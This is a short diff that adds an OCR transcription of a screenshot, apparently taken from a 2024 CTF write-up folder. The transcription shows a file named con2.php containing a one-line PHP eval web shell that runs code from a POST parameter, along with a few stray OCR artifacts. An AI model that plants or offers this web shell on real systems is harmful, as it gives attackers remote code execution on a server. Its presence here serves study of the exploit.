@@ -1,0 +1,9 @@
+# OCR: 192410d754b0360d17b615d179a79060.jpg
+# 来源: .\02-WriteUp\2024\192410d754b0360d17b615d179a79060.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:23
+
+® con2php X
+# con2.php
+d <?php @eval ($_POST[2335]);?>
+2
